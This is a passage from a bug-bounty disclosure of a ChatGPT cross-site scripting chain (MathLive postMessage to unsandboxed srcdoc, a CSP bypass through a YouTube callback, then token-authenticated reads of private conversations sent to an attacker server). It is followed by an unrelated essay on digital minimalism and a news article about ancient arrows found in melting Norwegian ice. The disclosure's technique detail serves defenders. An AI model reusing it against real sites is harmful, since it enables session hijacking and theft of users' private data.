the automatic path three times in a separate account, including after a hard refresh, with the alert appearing after roughly 4.5 seconds. The graph and Preview loaded independently, so the payload could occasionally send its message before MathLive was ready. The final carrier handled that race by retrying the same two messages for a limited period. A guard in the main page ensured that the private-conversation proof and outbound request ran only once. The public share modified the real ChatGPT page At this point, the public share could display an alert identified by the browser as coming from chatgpt.com and could add a banner to the main page. That proved where our code was running. It did not yet show why the bug mattered. An alert was not enough At this point, displaying an alert was the least interesting thing the exploit could do. The JavaScript was running as chatgpt.com , which meant it could interact with ChatGPT using the same authenticated context as the normal web application. The payload read the session information already available to the page and used it to call ChatGPT's conversation APIs. First, it enumerated the victim's recent conversations. It could then request message data for a selected private conversation: GET /backend-api/conversations?...&limit=20&order=updated&offset=0 GET /backend-api/conversations/<conversation-id>?num_turns=2 This was direct authenticated API access, not scraping text that happened to be visible on screen. The target conversation was unrelated to the malicious share and had never been shared with the attacker. Once the response was available to the injected JavaScript, sending data off-site was straightforward. The payload created an ordinary image request to a server we controlled. We deliberately sent only a small piece of the response off-site. The injected code had already received the authenticated conversation response and could read its contents, so the vulnerability was not limited to that value. Controlled proof that private conversation data could leave the victim's session The result was a practical cross-user data-theft primitive. A malicious public conversation could execute inside another user's signed-in ChatGPT session, enumerate private conversations, retrieve private message content, and send selected data to an attacker-controlled server. Because the code ran with the web application's authenticated access, its reach was not inherently limited to the conversation endpoints used in our proof. Other data and actions exposed through ChatGPT's authenticated frontend APIs sat inside the same security boundary. Essentially, we could perform any action on behalf of the victim's ChatGPT account. What went wrong and what OpenAI fixed The Preview sandbox itself worked. Code inside Preview could not directly read the ChatGPT page. The problem was that another component in the main page was willing to accept its instructions. Three design decisions turned that mistake into a full exploit: MathLive accepted a state-changing message without proving which frame sent it. The message format allowed raw HTML to be supplied as keyboard-layout data. That HTML could create an unsandboxed document that inherited the chatgpt.com identity. The YouTube response was the final workaround for CSP, not the root cause. Blocking only that endpoint would have removed one path to JavaScript while still leaving an untrusted Preview able to insert HTML into ChatGPT. OpenAI reproduced both the JavaScript execution and the private-conversation proof. The fix was rolled out across two versions of ChatGPT's web frontend. During the rollout, CSP changes blocked part of the original chain while one version still needed an update. On October 26, OpenAI confirmed that both versions now rejected the cross-frame MathLive messages used by the report and marked the issue resolved. The defensive lessons are fairly simple: A message receiver should verify both the sender's web address and the exact window that was given permission. Cross-window settings should not contain raw HTML. Dynamically created documents should remain sandboxed when their content can be influenced by an untrusted frame. CSP should be a backup control, not the only barrier after attacker-controlled HTML reaches the main site. This bug was interesting because every individual feature looked reasonable. Preview was isolated. Graphs could load a math keyboard. Frames could exchange messages. CSP allowed a major media provider. Public conversations could be shared. The vulnerability appeared only when all of those features were combined in one page. Timeline Date Event October 13, 2026 Confirmed the MathLive message-to-HTML path against ChatGPT's production code. October 14 Reproduced the chain through the normal UI and upgraded the fixed alert to arbitrary JavaScript. October 16 Confirmed public-share delivery between separate accounts and workspaces with one Preview click. October 17 Confirmed automatic Preview from share navigation and reproduced it after a hard refresh. October 18 Submitted the report to OpenAI's bug bounty program. October 19 Added the controlled private-chat disclosure proof. October 21 OpenAI reproduced the issue; severity was raised from the initial P2 triage to P1. October 22 OpenAI reported one web frontend fixed while the second was still being updated. October 23 CSP changes blocked part of the chain while one frontend update remained. October 26 OpenAI confirmed both frontends rejected the reported messages, resolved the issue, and awarded a total bounty of $5,000. Technical notes The main story above contains the complete exploit chain. The details below are included for readers who want to follow the production code and payload transformations more closely. The relevant deminified control flow was equivalent to: window.addEventListener("message", (event) => { if (event.data?.type !== "mathlive#virtual-keyboard-message") return; if (!validateOrigin(event.origin, this.originValidator)) return; this.handleMessage(event.data, event.source); }); if (message.action === "update-setting" && message.layouts) { this.layouts = message.layouts; } parameter Layout normalization preserved layouts[].layers[].markup . Showing the keyboard eventually performed the equivalent of: keyboardContainer.innerHTML = MathfieldElement.createHTML(keyboardHTML); parameter createHTML acted as an identity or Trusted Types wrapper, not a sanitizer. Trusted Types can restrict who assigns to an HTML sink, but an identity policy does not make an attacker-controlled string safe. The parser and CSP transition. The innerHTML operation could create an iframe, but a script inserted directly that way would remain inert. The unsandboxed srcdoc caused a fresh HTML document parse and inherited the embedding ChatGPT origin. That document also inherited the effective CSP captured during testing, which blocked inline code but permitted www.youtube.com in script-src-elem . The oEmbed response returned HTTP 200 with Content-Type: text/javascript; charset=UTF-8 and X-Content-Type-Options: nosniff ; no Cross-Origin-Resource-Policy header was observed. Google rewrote angle brackets in the callback, so the payload used classic function syntax instead of arrow functions. Ending the program with ;void consumed the error object appended by the endpoint. For the private-conversation proof, the function was converted to source with toString() , double quotes were converted to single quotes, and whitespace was collapsed. URLSearchParams then encoded it into the callback, the script URL was HTML-escaped inside <script src> , and that entire element was escaped again into the iframe's srcdoc attribute. The final callback was 5,533 characters; the YouTube URL was 7,309 characters; the script element was 7,337 characters; and the final iframe markup was 7,390 characters. The authenticated read. The same-origin frame parsed #client-bootstrap from the parent document, extracted the session access token and account ID, and required the account ID in the token to agree with the session when both were present. It used these in-memory headers: Authorization: Bearer <victim token> ChatGPT-Account-ID: <victim account> Accept: application/json The primary requests were: GET /backend-api/conversations?exclude_conversation_origin=tpp&expand=false&is_archived=false&is_starred=false&limit=20&order=updated&offset=0 GET /backend-api/conversations/<id>?num_turns=2&include_has_versions=true Only a 403, 404, or 405 on the detail request caused the code to try the legacy /backend-api/conversation/<id>?include_full_conversation=true route. The validation transmitted only a small selected value from the response. Before the external image request, it cleared references to the token, account, bootstrap, session, and request headers. Key takeaways Isolation is only as strong as every bridge across it. A sandboxed frame can still compromise its parent when a privileged listener trusts messages from the wrong sender. postMessage receivers must authenticate both event.origin and event.source before accepting state-changing instructions. HTML injection can become JavaScript execution through a fresh, unsandboxed document and an allowed third-party script endpoint. CSP is valuable defense in depth, but it cannot make an unsafe rendering path safe. The impact of same-origin JavaScript must be measured in the victim's authenticated context. Once code ran as chatgpt.com , it could reach the same private data and account actions available to the normal frontend—not merely display an alert. Cross-feature testing matters. This chain existed in the seams between public sharing, Preview, MathLive, frame creation, and CSP rather than in any one feature viewed alone. The broader lesson is that security boundaries have to hold across the complete product, not just inside individual components. Any public or shareable surface should be treated as attacker-controlled input, every cross-frame message should be authenticated, and untrusted markup should remain sandboxed throughout its entire rendering path. next Four bugs in four hours, and the sentence doing all the work back to all posts

Digital minimalism
body_text: Dark Mode Toggle Digital minimalism 2026 Oct 31 See all posts Digital minimalism For a long time I have been a fan of minimalism in my physical life: have few physical possessions, and try to do more with less. Four years ago, I wrote this blog post describing what I had in the 40-liter backpack that I travel around with. Physical minimalism, however, was an idea that came of age in the 2000s and 2010s and was responding to the challenges and the opportunities of the 2000s and 2010s. I continue to believe that it is valuable - though I recognize some arguments in the other direction, notably that having the right kinds of physical things can make more practical to have more self-sovereignty over your life. But I also think that in the modern era, we need a new kind of minimalism: digital minimalism . Digital minimalism is about being intentional about ways that you access digital technology, making each use a conscious choice rather than something that you get sucked into by default. In this post, I will describe some experiments that I've done in this direction. Social media minimalism Twitter (aka X) has always had a strain of toxicity to it, that has been increasing in recent years. The platform is definitely engaging , but it's often far from informative , and the ways in which it engages often do not make you feel good . But this all seemed to hit a particular crescendo for me around the end of 2024 and beginning of 2025. Many things were happening at that moment, but if you spent a lot of time on X you will likely remember a particular one: everyone seemed to be suddenly becoming fans of Adolf Hitler . This is not even mentioning the time that Grok itself briefly turned into "MechaHitler" . Around the same time, "Crypto Twitter" was spiraling into a mood that I saw described as "financial nihilism": roughly, that the natural end state of blockchains is gambling, this is good, and if you dislike this and wish for something better then you are a stuck-up elitist prick. Naturally, I had (and continue to have) my intellectual disagreements with both of these trends. But on top of that, I also started to more seriously pay attention to the fact that while the style of discourse on the platform was engaging , it was not enlightening and not making me feel good . And so for much of this year, I have been doing an experiment in distancing myself somewhat from this chaos. I did not leave X the platform , but I did leave X the interface . Instead, I have been doing most of my tweeting through Firefly : Firefly is a multi-client that combines together X, BlueSky as well as Farcaster and Lens (both partially-Ethereum-based decentralized social media platforms). You can see tweets from all four platforms, and you can make a tweet that gets auto-posted to all four platforms. My primary goal in doing this was to support decentralized social media, and to continue to engage with X but in a way that distributes network effect rather than locking it in. But in my months of using Firefly, I found that it also has a different effect: I feel much better using it . I suspect the primary reason is that while Firefly allows you to tweet, and see other people's tweets, it is missing one central part of the X interface: The Algorithmâ¢ . In particular, I suspect that in my time using the X interface, I fell into the following trap: See someone making a tweet supportive of Adolf Hitler. Click on the tweet and look around its quotes and responses, the same way that someone would morbidly stare at a car accident. The Algorithmâ¢ thinks: "This user seems to be a fan of Adolf Hitler. Let me mark that down as one of his interests." See ten tweets supportive of Adolf Hitler. Click and look around with morbid curiosity, the same way that someone would morbidly stare if they saw for the first time a car accident where ten cars were crashed and burning at the same time. The Algorithmâ¢ thinks: ... well, you get the idea. See a hundred tweets supportive of Adolf Hitler. Now, in fairness to X and Elon and its hard-working employees, the Adolf Hitler fandom does seem to have greatly wound down in the one and a half years since then. I suspect part of this is because such movements inevitably burn out once people realize how immoral and stupid they are. But another part is undoubtedly genuine improvements in how The Algorithmâ¢ works. But even still , in those moments when I go back into the X interface, I find myself logging back out and going back to Firefly. I also find that my mind has changed. I find myself less interested in the various battles that the intellectual titans on the platform seem to be sucking every day of their lives into. Recently, I logged back in, and I learned that the culture war issue du jour was that people were stridently arguing about whether or not Mao was evil. When I saw this, I had an emotional response that was sort of similar to what I think is the common experience of being an adult, seeing some food or TV show or game that you used to love as a kid, and realizing that you now find no interest in it at all. I smiled, and immediately went back to enjoying my day. My verdict: I recommend more people try this. Explore ways of greatly decreasing or scoping your social media use: use something like Firefly, access X only on Tuesdays, whatever works for you. Get the information benefits of the platform without getting sucked in to the vortex, which does operate on you in powerful subconscious ways that you may not realize. Cell data minimalism For a period of 100 days, I embarked upon a second experiment: I lived my life with my phone always on airplane mode. I still used wifi, but not my cell connection. I had two goals in doing this: Privacy . A phone connected to cell is an always-on tracking device. Cell companies are notoriously bad at keeping that data secure, and sometimes they themselves sell it . So there is a large chance that a trail of your location will end up in the hands of intelligence agencies, military contractors, advertising companies, and more. Anonymous SIM cards are not a sufficient solution, for two reasons: (i) your phone can still be linked across its entire usage lifetime through its IMEI number, and (ii) you leak all kinds of data that can be used to reconstruct who you are from your fine-grained movement patterns, internet access patterns, and modern AI makes it very practical to uncover these patterns. Hence, the best location privacy solution is not having a cell connection at all (also, use GrapheneOS, and be very limited in what apps you give location permissions to; I had already been doing both). Mental health . Not having the internet at all for significant periods of time (when I'm outside) has been a good way of (re-)building the habit of surviving without it, and getting more mental peace and the space to think about other more healthy and productive things. On the whole, I consider the experiment to have been a success. During those 100 days, I violated the "no cell data" rule once literally but not spiritually - I turned it on briefly to receive a confirmation code that I needed in order to maintain that phone plan itself, and once spiritually but not literally - when going on a remote and slightly dangerous hike, friends insisted that I bring along a few communication devices that they had for emergency comms and use them to check in once every few hours. My largest inconvenience was a stretch of time I was in Singapore, when my inability to receive SMS confirmation codes meant that I could not log into Grab (the regional Uber equivalent). As a result, my food options were more limited, and I had to take the subway instead of a car even in situations where that was much more inconvenient. Since those 100 days, I have opened the cell connection occasionally, but so far I have broadly continued an "airplane mode by default" lifestyle. For navigation, I used CoMaps , a local-first mapping application that downloads OpenStreetMap data and then shows you a map, gives you directions to get where you need, etc locally. My general review of CoMaps is that I find it worse than Google Maps for navigating the human world (restaurants, stores, opening hours...) but better for navigating the natural-ish world (it knows about many trails that Google Maps does not, though it does occasionally fail by claiming trails that do not actually exist, leaving me on one occasion pushing through hundreds of meters of shrubbery to get back to civilization). I also became interested in the concept of local world knowledge apps. In principle, the data size of meaningful packs of information about the whole world is not that large. Compressed English wikipedia (without media) is only 27 GB . OpenStreetMap's planet.asm is 2.2 TB, though you can doubtlessly prune that down to 1-10% of its size and have everything you might conceivably need. This month there was a bounty (organized by Statuette; I contributed as one of the donors) to create local phone apps that try to make useful knowledge easily accessible offline. Here are two of the apps: Left: FieldAtlas . Right: Commonplace My general impression is: right now, we are exactly on the cusp of these kinds of apps starting to make sense. Most of the participants in the competition were trying to use on-device text LLMs to think for a long time before coming up with an answer. My impression is that this approach was too slow: answering a single question would take anywhere from 1 to 22 minutes. The best apps, on the other hand, used some kind of semantic search to show the user a search result from the local database immediately, and then followed that up with a very small LLM writing a text answer. This gives actually-good answers in a very reasonable timeframe. Finally, when you're out and about, especially if you have meetings, sometimes you do need to have internet when you're on the go. When you arrive at a place, you often need to contact a person you're meeting to confirm their exact location or to get them to open the door. When you're at one meeting, you often need to re-confirm details about the next. If you don't have cell data, your only option is public wifi - and importantly, the public wifi hotspot must allow you to connect without providing an SMS confirmation code. Different places are very different in terms of how friendly they are. Here is a quick tier list, taken from places I've traveled to while I was paying attention to public wifi availability: Taiwan (or at least, the Taipei area) Taipei has a huge number of public wifi hotspots. When I opened my phone to check when walking outside (or even when inside an Uber), there was literally an over 25% chance that there was a hotspot I could connect to that was in range at that moment. Usually, these were either municipal government wifi, or public wifi run by local convenience store chains. Ukraine, USA, Canada, Singapore Ukraine was the most surprising for me. In a surprisingly large number of places, across multiple cities, there were open hotspots available, some of which did not even require a clickthrough. (If you're wondering if it's responsible for them to do this, given Ukraine's security needs, I suspect the answer is that they are primarily concerned about decreasing the enemy's internet access near the frontline and on drones flying at high speed through the air toward their cities, and street-level wifi is not really useful for either of those) USA, Canada and Singapore were all similar: they had a very high number of theoretically-public wifi hotspots in general, but a large portion of those hotspots were gated behind either SMS or some kind of login. But even still, a very significant number of open wifi hotspots were available. Also, I learned that Toronto has a fraternity (or sorority) that seems to be named after SBF. Austria, Hungary Both halves of Charles I's old empire are similar. There are many hotspots, but the great majority of the public ones require an SMS confirmation code to log in. I could find properly open wifi, but on several occasions it took trying quite a few hotspots and walking around for a while. Switzerland Despite its general reputation for privacy, Switzerland ranked at the bottom for me. Almost all public wifi hotspots require an SMS confirmation code. In my first 1.5 kilometers walking through the downtown, I found only two that do not: a random shoe store, and Starbucks, which lets you connect for 10 minutes, and then longer if you enter a confirmation code that you receive by email. Web minimalism Recently, I have been starting to do more and more things without relying on user interfaces inside of websites at all. The last few times I updated my IPFS hash on ENS, I did so through a command-line tool that an AI wrote for me. Many of the payments that I make through privacy protocols, I now make through the kohaku-cli tool . Sending through kohaku-cli. Today, the CLI is even cleaner and easier to use; no need to specify the value twice and know what a tail call is. Websites and web applications, especially web applications for doing crypto things, are dangerous for several reasons: If you access a web application, you end up re-downloading the application from the server thousands of times, and you are fully trusting the server each time . If the server gets hacked even one of the thousands of times that you open the site, you might be screwed. Regular old-fashioned applications (where you explicitly click "download") are better than this: you only need to trust the server to not be malicious or hacked at that exact moment once. Websites and web applications are by default very bad for privacy . When you access a website, it can see your browser (including version number), your operating system, your screen size, and once you start acting hundreds of other data points (eg. mouse movements, button click patterns) that quickly identify you. Websites often send user data (and metadata) to all kinds of third-party providers, from CDNs serving scripts to analytics companies, and this all happens by default. As we've seen with social media, web applications crafted by third parties with commercial interests may not have your interests at heart. Fine-grained UI decisions may be dark patterns optimized to extract, whereas what you want is bright patterns that are optimized to enlighten and educate and protect you. So what's the alternative? Basically, bring back the Unix Philosophy , but make it better and much more user-friendly with local AI: speak English to tell your computer what to do rather than Bash. At its core, the Unix philosophy was simple: make simple, modular tools that each do one thing and one thing well, and that are designed to talk to each other through the most universal interface (text). You as a user have extremely fine-grained choice about how to make the different programs fit together. UIs, on the other hand, combine many functionalities into one single opaque tool produced by a single developer. At their apex, UIs turned into "super-apps", which greatly concentrate power in the application developer and have complex and unintelligible internal workings, magnifying security risks. With LLMs, we can go back to the Unix philosophy approach, putting the fine-grained decision-making power back into the user's hands, but without the downside of everyone needing to become a programmer. Conclusion Physical-world minimalism, of the style that became popular in the 2000s and 10s, was made possible by a new wave of technology: computers and the internet. A single computer could substitute for dozens of physical things. As a result, you could live a life of much greater simplicity and freedom, with just a laptop, a few sets of clothing, and basic charging and hygiene equipment. Physical minimalism was much harder before the internet; it was doable, but would entail a much more complex lifestyle commitment. After the internet, the costs of a more physically minimalistic lifestyle greatly dropped. With the last ten years of progress of software quality, together with modern AI, I would argue that we now have the wave of technology needed to similarly enable the next wave of minimalism: digital minimalism. We need social media less than before, because you can talk to the bot for information instead (and for human connection, there's still the old-fashioned solution: going out and talking to people in real life). We need the internet less than before, because there's so much more you can do purely locally and offline. And we need the web less than before, because you can do much more, and more conveniently, though either command-line tools or custom-made user interfaces, and AI can help you use or craft both. And these things are all happening at exactly the time that the flaws of these previous paradigms - and, for that matter, the flaws of using AI in the wrong way - are reaching their apex, and so a digital minimalism is becoming more and more necessary. Each person's path to digital minimalism will be different, as each person has different needs. But I highly recommend everyone try reducing their digital clutter in at least one important way, and if you like the result then keep going.

title: The oldest ice disappears and the Stone Age emerges from it
body_text: 6,000-year-old Stone Age arrows emerge from melting ice in Norway Jump to main content Discover our other sites: Norske og internasjonale forskningsnyheter Forskningsnyheter for unge Science news from Norway in English Science news from Norway in English Meninger, debatt og blogger skrevet av forskere Meninger, debatt og blogger skrevet av forskere Forskning.nos stillingsmarked Health Society Environment Natural Sciences Researchers' Zone You might be looking for... Health Covid-19 Food Exercise Sleep Society Work Sexuality Children and youth School and education History Archeology Vikings Environment Climate change Green energy Pollution Natural Science Physics Space Animals Ocean Fish Researchers' Zone Opinion Share your science Advertise with us Learn to write Contact us About us Annonse The oldest ice is disappearing: The Stone Age is emerging from the melting ice 'We have been at the edge of the ice. We have seen it happening. And we are witnesses to a rapidly changing archaeological landscape,' write the glacial archaeologists. Finds from the Viking Age are becoming scarce, while 6,000-year-old arrowheads are now emerging from the melting ice. A 5,000-year-old arrowhead made of slate, found together with parts of its shaft right at the edge of the ice. Domesticated reindeer can be seen on the ice patch in the background. (Photo: Åsa Rommetveit Celius / Innlandet County Municipality / Secrets of the Ice) Ida Irene Bergstrøm Ida Irene Bergstrøm Journalist Published 26 September 2026 - 00:01 For exactly 20 years, archaeologists working with Secrets of the Ice have been recovering and preserving artefacts emerging from the ice in the mountains of Innlandet, eastern Norway. Until now, most of the objects have been up to 2,000 years old. Many date from the Viking Age. But the ancient ice is now beginning to melt. And within this oldest ice lie the oldest finds: large quantities of arrow shafts and arrowheads from the Bronze Age and the Stone Age. A bone arrowhead found together with parts of its shaft right beside the ice. Approximately 5,000 years old. (Photo: Frys Film / Innlandet County Municipality / Secrets of the Ice) An arrowhead made from a freshwater mussel shell, dating from the Bronze Age, approximately 3,600 years old. The arrowhead is fragile and has begun to split apart. (Photo: Frys film / Innlandet County Municipality / Secrets of the Ice) Here comes the Stone Age Annonse One of the oldest finds from this year's first field expedition is an arrow with an arrowhead and shaft made of slate. By comparing it with previously discovered arrows, archaeologists estimate that it is between 5,000 and 6,000 years old. The fact that arrows are emerging from the melting ice is not surprising. Over the 20 years they have been working here, the archaeologists have found extensive evidence of reindeer and reindeer hunting . They have also found clothing, shoes , dead packhorses, and a pair of skis . The preservation conditions in the ice have meant that organic material, such as wood, leather, and textiles, have also survived. “This year, we found 48 prehistoric arrows. That's a lot,” Espen Finstad, who leads Secrets of the Ice, tells Science Norway. He explains that, with these latest discoveries, more than 100 arrowheads and arrow shafts have now been recovered from a single ice patch over the years. The oldest arrowheads are made from slate, freshwater mussel shells, and bone. More recent arrowheads are made from iron and are 'only' between 1,000 and 1,500 years old. Archaeologist Åsa Rommetveit Celius from Innlandet County Municipality documents the discovery of a 1,000-year-old arrow shaft. (Photo: May-Tove Smiseth / Innlandet County Municipality / Secrets of the Ice) Archaeologist Kjetil Loftsgarden from the Museum of Cultural History in Oslo holds a complete 1,800-year-old arrow with a bone arrowhead and a wooden shaft. (Photo: Espen Finstad / Innlandet County Municipality / Secrets of the Ice) A brutal backdrop But this year’s fieldwork carries an added sense of gravity. Finstad explains that the work of recovering archaeological artefacts from the ice has always carried a certain duality. “It’s fun going around looking for things. It’s exciting, and finding something is just really cool," he says. Yet behind the excitement lies the reality of climate change. Finstad points to the recent landslide in Nepal and the glacier collapse in Jotunheimen. “We have always acknowledged this contradiction and the reality behind our work. But this is the first time it has truly affected us on an emotional level,” Finstad says, adding: “This year, there was a much deeper sense of seriousness and sadness. Only patches of ice remain where we once had large ice patches. It's brutal. And this year, that reality struck us more forcefully than ever before." Annonse Participants in the field from the Glacier Archaeology Programme in Innlandet, Secrets of the Ice. (Photo: Frys Film / Innlandet County Municipality / Secrets of the Ice) The glacial archaeologists’ tent camp in Jotunheimen at sunrise. Fresh snow on the ground. (Photo: Espen Finstad / Innlandet County Municipality / Secrets of the Ice) Finstad and his colleagues estimate that most of the ice patches containing archaeological artefacts will have disappeared within the next 20 years. “There has been ice here for 6,000–7,000 years. Nature has been warning us and sending signals for many years. But now it's giving up. Now it is simply going to melt,” says the glacial archaeologist. 'For thousands of years, ancient ice has safely preserved unique objects from the past. Now that ice is disappearing,'  the archaeologists write in a press release about the finds. 'We have been at the edge of the ice. We have seen it happening. And we are witnesses to a rapidly changing archaeological landscape.' Se dette innlegget på Instagram Et innlegg delt av forskning.no (@forskning.no) The lower section of one of the ice patches at Hanklefonne. It was once large. Now only a small, steep section remains. 'The ice is disappearing much faster than we expected. The landscape has changed dramatically, and large areas that were recently covered by ice are now ice-free,' the glacial archaeologists write in a press release. (Photo: Espen Finstad / Innlandet County Municipality / Secrets of the Ice) More fieldwork ahead Finstad and his colleagues are planning more fieldwork in the coming weeks, weather permitting. So far, they have secured finds in the Kvittingskjølen mountain area of Jotunheimen, specifically at Langfonne, Storefonne, and Hanklefonne. Several of the finds are already on display at the Norwegian Mountain Centre in Lom, just a few days after they were discovered. ——— Translated by Alette Bjordal Gjellesvik Read the Norwegian version of this article on forskning.no Related content A 1,300-year-old arrow and horse dung have emerged from a melting Norwegian glacier Melting ice near Norway's highest mountain reveals horse bridle that could stem from the Viking Age Subscribe to our newsletter The latest news from Science Norway, sent twice a week and completely free.
